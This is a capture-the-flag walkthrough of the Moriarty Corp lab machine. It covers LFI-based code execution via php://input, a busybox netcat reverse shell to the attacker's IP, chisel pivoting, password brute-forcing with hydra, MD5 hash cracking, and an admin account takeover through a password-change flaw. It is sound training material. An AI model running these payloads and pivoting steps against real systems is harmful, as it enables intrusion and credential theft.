# BoredHackerBlog: Moriarty Corp Walkthrough

# Description
```bash
Hello Agent.

You're here on a special mission.

A mission to take down one of the biggest weapons suppliers which is Moriarty Corp.

Enter flag{start} into the webapp to get started!

Notes:

Web panel is on port 8000 (not in scope. Don’t attack)
Flags are stored in #_flag.txt format. Flags are entered in flag{} format. They're usually stored in / directory but can be in different locations.
To temporarily stop playing, pause the VM. Do not shut it down.
The webapp starts docker containers in the background when you add flags. Shutting down and rebooting will mess it up.
(the story is bad. sorry for the lack of creativity)

Difficulty: Med-Hard

Tasks involved:

port scanning
webapp attacks and bug hunting
pivoting (meterpreter is highly recommended)
password guessing/bruteforcing
Virtual Machine: - Format: Virtual Machine (Virtualbox OVA) - Operating System: Linux

Networking: - DHCP Service: Enabled - IP Address Automatically assign

This works better with VirtualBox rather than VMware.
```

# Exploitation
Let's start with a network scan
```bash
 Currently scanning: 192.168.0.1/24   |   Screen View: Unique Hosts                                                                                                                                               
                                                                                                                                                                                                                  
 3 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 180                                                                                                                                                  
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.0.103   58:11:22:85:0d:41      2     120  ASUSTek COMPUTER INC.                                                                                                                                          
 192.168.0.115   08:00:27:05:6f:31      1      60  PCS Systemtechnik GmbH   
```
\
Next, open ports
```bash
```
\

This  is a story mode style box , so opening port 8000 
\
<img width="1300" height="535" alt="image" src="https://github.com/user-attachments/assets/07e6e1bf-108b-46d3-8ea1-a39aa20810e8" />
\
So enter the flag "flag{start}" in the box to start
\
<img width="1194" height="544" alt="image" src="https://github.com/user-attachments/assets/a44fbb5b-f545-43ae-9501-d4b130074ec9" />
\
Now , the port 80 is open and available to access
\
Basic website with 2 links 
\
<img width="436" height="195" alt="image" src="https://github.com/user-attachments/assets/ed32ba66-cb3e-48e7-a2eb-81cf411646a8" />
\
If we click on one of them and see the url , it has a file parameter
\
<img width="983" height="433" alt="image" src="https://github.com/user-attachments/assets/f6e9598e-c399-4947-8474-534654466dfb" />
\
So i try to test for LFI vulnerability
\
<img width="699" height="756" alt="image" src="https://github.com/user-attachments/assets/95ce3330-cc62-4b41-8c6b-6cb00070a2a9" />
\
It works , so i start enumerating for files to try to chain attacks or get useful info
\
After wasting a lot of time , i read the description again and realize that i have to find the flag which is of the format "#_flag.txt" from the "/" directory of the target machine
\
<img width="492" height="213" alt="image" src="https://github.com/user-attachments/assets/bdbd51a5-062d-4852-9a4c-ba5ca903f0ba" />
\
After entering the flag on port 8000 , we now get more information
\
<img width="1202" height="534" alt="image" src="https://github.com/user-attachments/assets/5962dd58-a212-4776-98dd-c91de2ca5854" />
\
After wasting a lot of time , i realized what if i used php filters to get the source code of the app
\
<img width="1681" height="661" alt="image" src="https://github.com/user-attachments/assets/08f0456c-0f6d-4392-92ab-000bb9f02efb" />
\
Actually i was fuzzing for readable files and found the app directory as "/app"  from the file "/etc/apache2/httpd.conf"
```bash
<Directory "/app/">
	AllowOverride All
</Directory>
```
\
Even if we dont use "/app" in the request , it will relatively get the same result , since the app is running in same directory
\
After realizing that the source code had "include" function of php , we know that it can execute php commands
```bash
$incfile = $_REQUEST["file"];
include($incfile);
```
\
So i test a POST curl command
```bash
curl -X POST "http://192.168.0.116/?file=php://input" -d "<?php system('id'); ?>"
<html>
<head>
<title>Welcome to Moriarty Corp. Blog</title>
</head>
<body>
<p>
Welcome to Moriarty Corp. Blog. All our business is legit.
<br/>
Check out our blog posts:<br/>
<a href="/?file=page1.html">Blog Post 1</a><br/>
<a href="/?file=page2.html">Blog Post 2</a><br/>
</p>
<p>
uid=100(apache) gid=101(apache) groups=82(www-data),101(apache),101(apache)
</p>
</body>
</html>
```
\
Then to convert into a reverse shell i used the command
```bash
curl -X POST "http://192.168.0.116/?file=php://input" -d "<?php system('busybox nc 192.168.0.124 4444 -e /bin/sh'); ?>"
```
```bash
penelope
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.0.124
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from 6b0391ef95b7~192.168.0.116-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[!] Cannot upgrade shell with the available binaries...

  1) Upload https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/socat
  2) Upload local socat binary
  3) Specify remote socat binary path
  4) None of the above

[?] Select action: 1
[•] Download URL: https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/socat
 ⤷ [########################################] 100% (366.4 KBytes/366.4 KBytes) | Elapsed 0:00:00
[+] Upload OK /var/tmp/socat

[!] Python agent cannot be deployed. I need to maintain at least one Raw session to handle the PTY
[+] Attempting to spawn a reverse shell on 192.168.0.124:4444
[+] Got reverse shell from 6b0391ef95b7~192.168.0.116-Linux-x86_64 😍 Assigned SessionID <2>
[+] Shell upgraded successfully using /var/tmp/socat! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/sessions/6b0391ef95b7~192.168.0.116-Linux-x86_64/2026_04_21-09_46_28-492.log 📜
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
/bin/sh: id
uid=100(apache) gid=101(apache) groups=82(www-data),101(apache),101(apache)
/app $ 

```
\
Then, since the author had mentioned that we need to find internal picture database site , The IP range used by internal machines is 172.17.0.3-254.
```bash
/tmp $ curl 172.17.0.4
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xml:lang="en" lang="en" xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="content-type" content="text/html; charset=utf-8" />
<title>Simple Image Warehouse</title>
</head>
<body>
        <form enctype="multipart/form-data" action="index.php" method="post">
        <fieldset>
        <input type="file" name="plik[]" />
        <input type="file" name="plik[]" />
        <input type="file" name="plik[]" />
        Password: <INPUT TYPE="password" NAME="password" />     <input type="submit" value="Log IN! / Send IT!" />
        </fieldset>
        </form>
        <hr>
<div align="center"><a href="http://sourceforge.net/projects/imwar/">Simple Image Warehouse</a></div>
</body>
</html>
```
\
I had to findout which other ip was hosting the service and found it to be "172.17.0.4"
\
So i create a port forwarding to access from the attacker machine
\
Steps for port forwarding using chisel are 
```bash
Server side
./chisel_1.11.3_linux_amd64 server -p 9001 --reverse
Target machine side
./chisel_1.11.3_linux_amd64 client 192.168.0.124:9001 R:9999:172.17.0.4:80
```
\
Opening the local port 9999 on browser showed 
\
<img width="1459" height="148" alt="image" src="https://github.com/user-attachments/assets/5c68e6cf-9e36-4e1c-bcfa-97faf5507e5c" />
\
So i tried to upload radom files and used a random sample password '1234'
\
And nothing happened
\
<img width="1236" height="198" alt="image" src="https://github.com/user-attachments/assets/64f9e802-4513-43be-b6c6-4e12e9efccf5" />
\
Since the author said to bruteforce it , i used the wordlist "fasttrack.txt" from my intercepted burp traffic ( Incase your burp is not able to intercept localhost traffic , give a new hostname in /etc/hosts for 127.0.0.1 other than localhost and access via that)
\
<img width="1167" height="388" alt="image" src="https://github.com/user-attachments/assets/07e706ab-573e-4976-8d44-ea41f1ce6355" />
\
After logging in with the password , we get this page ( i had tested with 3 files )
\
<img width="1196" height="505" alt="image" src="https://github.com/user-attachments/assets/b7bd3114-db3d-4d95-9b52-0f9d8c9ff0ef" />
\
Then we can just execute the uploaded file by clicking on it ( since i had uploaded a reverse shell script , i had a listener on for that port)
```bash
nc -nlvp 4445             
listening on [any] 4445 ...
connect to [192.168.0.124] from (UNKNOWN) [192.168.0.118] 37508
Linux 0b1d1507f1f8 4.15.0-39-generic #42-Ubuntu SMP Tue Oct 23 15:48:01 UTC 2018 x86_64 Linux
sh: w: not found
uid=100(apache) gid=101(apache) groups=82(www-data),101(apache),101(apache)
sh: can't access tty; job control turned off
/ $ id
uid=100(apache) gid=101(apache) groups=82(www-data),101(apache),101(apache)
/ $ ifconfig
eth0      Link encap:Ethernet  HWaddr 02:42:AC:11:00:04  
          inet addr:172.17.0.4  Bcast:172.17.255.255  Mask:255.255.0.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:592 errors:0 dropped:0 overruns:0 frame:0
          TX packets:769 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:1961624 (1.8 MiB)  TX bytes:369141 (360.4 KiB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
```
\
This means , we have successfully gotten a reverse shell on a internal network machine
\
We then find our "2_flag.txt"
```bash
/ $ ls -la
total 72
drwxr-xr-x   45 root     root          4096 Apr 21 20:34 .
drwxr-xr-x   45 root     root          4096 Apr 21 20:34 ..
-rwxr-xr-x    1 root     root             0 Apr 21 19:51 .dockerenv
-rw-rw-r--    1 root     root            34 Nov 19  2018 2_flag.txt
drwxr-xr-x    6 apache   apache        4096 Apr 21 19:51 app
drwxr-xr-x    2 root     root          4096 Jan  9  2018 bin
drwxr-xr-x    5 root     root           340 Apr 21 19:51 dev
drwxr-xr-x   27 root     root          4096 Apr 21 19:51 etc
drwxr-xr-x    2 root     root          4096 Jan  9  2018 home
drwxr-xr-x    7 root     root          4096 May 15  2018 lib
drwxr-xr-x    5 root     root          4096 Jan  9  2018 media
drwxr-xr-x    2 root     root          4096 Jan  9  2018 mnt
drwxr-xr-x    5 root     root          4096 May 15  2018 opt
dr-xr-xr-x  183 root     root             0 Apr 21 19:51 proc
drwx------    2 root     root          4096 Jan  9  2018 root
drwxr-xr-x    4 root     root          4096 Apr 21 19:51 run
drwxr-xr-x    2 root     root          4096 Jan  9  2018 sbin
drwxr-xr-x    2 root     root          4096 Jan  9  2018 srv
dr-xr-xr-x   13 root     root             0 Apr 21 19:51 sys
drwxrwxrwt    2 root     root          4096 Apr 21 20:46 tmp
drwxr-xr-x   14 root     root          4096 May 15  2018 usr
drwxr-xr-x   17 root     root          4096 Apr 21 20:46 var
/ $ cat 2_*     
flag{picture_is_worth_1000_words}
```
\
After entering the new flag in the website at port 8000 , we get new info
\
<img width="1171" height="718" alt="image" src="https://github.com/user-attachments/assets/3e20cc4b-bfb4-47a3-b082-18217b1ea797" />
\
WE have been given some credentials to ssh as
```bash
Usernames:
root
toor
admin
mcorp
moriarty

Password hashes (crack before brute forcing):
63a9f0ea7bb98050796b649e85481845
7b24afc8bc80e548d66c4e7ff72171c5
5f4dcc3b5aa765d61d8327deb882cf99
21232f297a57a5a743894a0e4a801fc3
084e0343a0486ff05530df6c705c8bb4
697c6cc76fdbde5baccb7b3400391e30
8839cfc8a0f24eb155ae3f7f205f5cbc
35ac704fe1cc7807c914af478f20fd35
b27a803ed346fbbf6d2e2eb88df1c51b
08552d48aa6d6d9c05dd67f1b4ba8747
```
\
From the current machine we try to find another machine on the internal netowrk that has its ssh service open
```bash
/ $ nc 172.17.0.5 22 -vvv
172.17.0.5 (172.17.0.5:22) open
SSH-2.0-OpenSSH_7.5
id
Protocol mismatch.
```
\
Since the ip's were in order , i tested for 172.17.0.5 first and it worked , so we now have to ssh into this machine , but befire, we have to crack the passwords given 
\
I  used crackstation to crack all of the given md5 hashes
\
<img width="1831" height="731" alt="image" src="https://github.com/user-attachments/assets/520d758f-9707-4436-a6a7-94f355a15075" />
\
These are the cracked passwords
```bash
root
toor
password
admin
guest
MORIARTY
MCORP
mcorp
weapons
moriarty
```
\
Now , we have to port forward the ssh port of the new machine(172.17.0.5) to our attacker machine 
\
On our attacker machine , since the chisel is still on , we get a new client connected to it
```bash
 server: session#26: tun: proxy#R:9998=>172.17.0.5:22: Listening
```
\
And on the new client side , we get 
```bash
tmp $ ./chisel_1.11.3_linux_amd64 client 192.168.0.124:9001 R:9998:172.17.0.5:22
2026/04/21 21:05:43 client: Connecting to ws://192.168.0.124:9001
2026/04/21 21:05:43 client: Connected (Latency 639.189µs)
```
\
Then i use hydra to bruteforce the credentials
```bash
hydra -L users.txt -P pw.txt -t 20 127.0.0.1 -s 9998 ssh
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-21 17:10:15
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 20 tasks per 1 server, overall 20 tasks, 50 login tries (l:5/p:10), ~3 tries per task
[DATA] attacking ssh://127.0.0.1:9998/
[9998][ssh] host: 127.0.0.1   login: root   password: weapons
1 of 1 target successfully completed, 1 valid password found
```
\
We login as root user
```bash
sh root@127.0.0.1 -p9998                  
The authenticity of host '[127.0.0.1]:9998 ([127.0.0.1]:9998)' can't be established.
ED25519 key fingerprint is SHA256:mjnB4cbnNOEs4pNNqyRdb+b5zSxF6nxb6lNl4mC6pNE.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[127.0.0.1]:9998' (ED25519) to the list of known hosts.
root@127.0.0.1's password: 
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See <http://wiki.alpinelinux.org>.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

1835b629d266:~# id
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
1835b629d266:~# ls -la
total 16
drwx------    2 root     root          4096 Apr 21 21:11 .
drwxr-xr-x   33 root     root          4096 Apr 21 21:11 ..
-rw-------    1 root     root            10 Apr 21 21:11 .ash_history
-rw-rw-r--    1 root     root           256 Nov 20  2018 email.log
1835b629d266:~# cat email.log 
from: buyer@anonymous.corp
to: Moriarty@m.corp
subject: Buying
I have no license. I need to buy some stuff. I am willing to pay extra.

from: Moriarty@m.corp
to: buyer@anonymous.corp
subject: re: Buying
I will send you a URL of my chat server. Let's talk.
```
\
Then i get the 3rd flag 
```bash
1835b629d266:/# ls -la
total 68
drwxr-xr-x   33 root     root          4096 Apr 21 21:11 .
drwxr-xr-x   33 root     root          4096 Apr 21 21:11 ..
-rwxr-xr-x    1 root     root             0 Apr 21 20:50 .dockerenv
-rw-rw-r--    1 root     root            19 Nov 19  2018 3_flag.txt
drwxr-xr-x    2 root     root          4096 Jan  9  2018 bin
drwxr-xr-x    5 root     root           340 Apr 21 20:50 dev
-rwxr-xr-x    1 root     root           164 Feb 23  2018 entrypoint.sh
drwxr-xr-x   20 root     root          4096 Apr 21 20:50 etc
drwxr-xr-x    2 root     root          4096 Jan  9  2018 home
drwxr-xr-x    6 root     root          4096 Jan  9  2018 lib
drwxr-xr-x    5 root     root          4096 Jan  9  2018 media
drwxr-xr-x    2 root     root          4096 Jan  9  2018 mnt
dr-xr-xr-x  186 root     root             0 Apr 21 20:50 proc
drwx------    2 root     root          4096 Apr 21 21:11 root
drwxr-xr-x    2 root     root          4096 Apr 21 20:50 run
drwxr-xr-x    2 root     root          4096 Jan  9  2018 sbin
drwxr-xr-x    2 root     root          4096 Jan  9  2018 srv
dr-xr-xr-x   13 root     root             0 Apr 21 20:50 sys
drwxrwxrwt    2 root     root          4096 Jan  9  2018 tmp
drwxr-xr-x   10 root     root          4096 Jan  9  2018 usr
drwxr-xr-x   12 root     root          4096 Jan  9  2018 var
1835b629d266:/# cat 3_*
flag{what_weapons}
```
\
After enteing the flag into the webportal on port 8000
\
<img width="1211" height="508" alt="image" src="https://github.com/user-attachments/assets/7caeebba-d0c4-4d33-a6a4-2abea7eb7c15" />
\
Since the author said that the new service is on another machine in the internal network and on one of the ports , i checked manually
```bash
1835b629d266:/# nc 172.17.0.6 443 -vvv
nc: 172.17.0.6 (172.17.0.6:443): Connection refused
sent 0, rcvd 0
1835b629d266:/# nc 172.17.0.6 8000 -vvv
172.17.0.6 (172.17.0.6:8000) open

^Csent 1, rcvd 0
punt!

1835b629d266:/# nc 172.17.0.6 8080 -vvv
nc: 172.17.0.6 (172.17.0.6:8080): Connection refused
sent 0, rcvd 0
1835b629d266:/# nc 172.17.0.6 8888 -vvv
nc: 172.17.0.6 (172.17.0.6:8888): Connection refused
sent 0, rcvd 0
```
\
So it is port 8000 and i need to port forward it again to attacker machine
\
Now on server we have
```bash
server: session#35: tun: proxy#R:9997=>172.17.0.6:8000: Listening
```
\
ON client side
```bash
1835b629d266:/tmp# ./chisel_1.11.3_linux_amd64 client 192.168.0.124:9001 R:9997:172.17.0.6:8000
2026/04/21 21:17:38 client: Connecting to ws://192.168.0.124:9001
2026/04/21 21:17:38 client: Connected (Latency 674.672µs)
```
\
going to that port on browser asks for http auth
\
<img width="1071" height="349" alt="image" src="https://github.com/user-attachments/assets/99768f3c-44f2-4c8b-9d15-d1c4d46a7c63" />
\
So with the known credentials of 
```bash
buyer13 : arms13
```
\
We login to this page
\
<img width="504" height="389" alt="image" src="https://github.com/user-attachments/assets/3c14fba9-63eb-4a51-a327-25d5e40aa890" />
\
If we click on chats
\
<img width="617" height="227" alt="image" src="https://github.com/user-attachments/assets/7c0a3df4-b2b2-40b0-9437-059091b722a7" />
\
From this we need to somehow get "chat logs for admin account"
\
There was also a change password option 
\
<img width="477" height="187" alt="image" src="https://github.com/user-attachments/assets/0946179e-0125-47af-9994-a81181ec58a6" />
\
Since it asked only for the new password , i was suspicious and intercepted the request
\
<img width="1136" height="307" alt="image" src="https://github.com/user-attachments/assets/7bd2b20d-e2ae-40f1-a7f1-7d171262b707" />
\
Here the parameter for username can be changed , so let's change to admin and try 
\
So now , i will intercept the requests and change the Basic auth header to base64 encoded version of "admin : 1234"
\
So we have successfully taken over the admin account
\
<img width="437" height="352" alt="image" src="https://github.com/user-attachments/assets/d2ebcfa1-d0de-42d1-89f6-f8ecd5865bb5" />
\
And now if we check chats
\
<img width="567" height="285" alt="image" src="https://github.com/user-attachments/assets/5d1cb861-9a8a-4778-a1b8-d57657b6db71" />
\
Now we got another flag and after entering that , we get
\
<img width="1165" height="389" alt="image" src="https://github.com/user-attachments/assets/3135fad9-e1be-429c-9bf9-0a1a8b52dd59" />
\
After this , we just search for known RCE exploit of "Elasticsearch" and get the final flag.
